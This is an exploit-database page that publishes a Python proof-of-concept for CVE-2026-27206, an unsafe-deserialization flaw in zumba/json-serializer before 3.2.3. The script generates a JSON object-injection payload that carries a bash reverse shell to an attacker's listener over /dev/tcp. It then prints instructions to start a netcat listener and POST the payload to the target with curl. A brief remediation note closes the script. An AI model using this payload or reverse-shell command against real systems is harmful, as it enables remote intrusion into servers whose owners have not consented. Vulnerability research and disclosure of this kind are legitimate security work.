---
title: zumba/json-serializer zumba/json-serializer <  3.2.3 RCE
url: https://cxsecurity.com/issue/WLB-2026030023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-15
fetch_date: 2026-03-16T04:33:21.872186
---

# zumba/json-serializer zumba/json-serializer <  3.2.3 RCE

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **zumba/json-serializer zumba/json-serializer < 3.2.3 RCE** **2026.03.15**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-27206](https://cxsecurity.com/cveshow/CVE-2026-27206/ "Click to see CVE-2026-27206")**  CWE:  **[CWE-502](https://cxsecurity.com/cwe/%20CWE-502 "Click to see  CWE-502")** | |

#!/usr/bin/env python3
# Exploit Title: zumba/json-serializer zumba/json-serializer < 3.2.3 RCE
# CVE: CVE-2026-27206
# Date: 2026-02-24
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub:
# Vendor Homepage: https://github.com/zumba/json-serializer
# Software Link: https://github.com/zumba/json-serializer
# Affected: zumba/json-serializer < 3.2.3
# Tested on: PHP 8.1 / 8.2
# Category: Remote Code Execution
# Platform: PHP
# Exploit Type: Remote
# CVSS: 8.1 (HIGH)
# CWE: CWE-502 (Deserialization of Untrusted Data)
# Description: Unrestricted PHP object instantiation via @type in JsonSerializer::unserialize() allowing arbitrary class creation and potential code execution via magic methods / gadget chains
# Fixed in: 3.2.3
# Usage: python3 exploit.py <target\_url> --lhost <your\_ip> --lport <your\_port>
#
# Examples:
# python3 exploit.py http://example.com/api/unserialize --lhost 192.168.1.100 --lport 4444
#
# Notes:
# • This script generates and shows a malicious payload.
# • Actual exploitation requires:
# 1. An endpoint that accepts JSON and passes it directly to JsonSerializer::unserialize()
# 2. A usable POP gadget chain present in the target application or its dependencies
# • Without a gadget chain this only demonstrates object injection (no RCE).
#
print("""
\_\_\_\_ \_\_\_\_\_ \_\_\_ \_ \_ \_\_\_ \_\_\_ \_\_\_
/ \_\_\_| | \_\_\_\_| / \_ \ | | | | / \_ \ / \_ \ / \_ \
| | | \_| | | | | | |\_| | | | | | | | | | | |
| |\_\_\_ | |\_\_\_ | |\_| | | \_ | | |\_| | |\_| | |\_| |
\\_\_\_\_| |\_\_\_\_\_| \\_\_\_/ |\_| |\_| \\_\_\_/ \\_\_\_/ \\_\_\_/
CVE-2026-27206 – Proof of Concept
────────────────────────────────────
Author : Mohammed Idrees Banyamer
Country : Jordan
Instagram : @banyamer\_security
Date : 2026-02-24
""")
import argparse
import json
import sys
def generate\_payload(lhost, lport):
# Example reverse shell command (modify for your target OS / needs)
revshell\_cmd = (
f"bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\""
)
# This is a DEMONSTRATION payload.
# In real attacks you need a valid gadget chain (Monolog, Symfony, Laravel, etc.)
payload = {
"@type": "RCEGadget",
"cmd": revshell\_cmd
}
return json.dumps(payload, separators=(',', ':'))
def main():
parser = argparse.ArgumentParser(description="CVE-2026-27206 Proof of Concept - Payload Generator")
parser.add\_argument("target", help="Target URL that accepts JSON input (for display only)")
parser.add\_argument("--lhost", required=True, help="Your IP address for reverse shell")
parser.add\_argument("--lport", required=True, help="Port to listen on")
args = parser.parse\_args()
print(f"[\*] Target URL (info only): {args.target}")
print(f"[\*] Listener: {args.lhost}:{args.lport}")
print()
malicious\_json = generate\_payload(args.lhost, args.lport)
print("[+] Generated malicious JSON payload:")
print("──────────────────────────────────────────────────────────────────────────────")
print(malicious\_json)
print("──────────────────────────────────────────────────────────────────────────────")
print()
print("[!] How to use this payload:")
print(" 1. Start a listener: nc -lvnp", args.lport)
print(" 2. POST the JSON above to an endpoint that uses JsonSerializer::unserialize()")
print(" Example (curl):")
print(f" curl -X POST {args.target} \\")
print(" -H 'Content-Type: application/json' \\")
print(" -d '" + malicious\_json.replace("'", "'\\''") + "'")
print()
print("[!] Important:")
print(" This payload only works if the application:")
print(" • Uses vulnerable zumba/json-serializer (< 3.2.3)")
print(" • Does NOT call setAllowedClasses()")
print(" • Contains a POP chain that triggers code execution from the crafted object")
print()
print(" Without a gadget chain → only object injection (no RCE)")
print(" Upgrade to >= 3.2.3 and use setAllowedClasses([]) or a whitelist")
if \_\_name\_\_ == "\_\_main\_\_":
if len(sys.argv) == 1:
print("Error: Missing arguments. Use --help for usage.\n")
sys.exit(1)
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030023)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top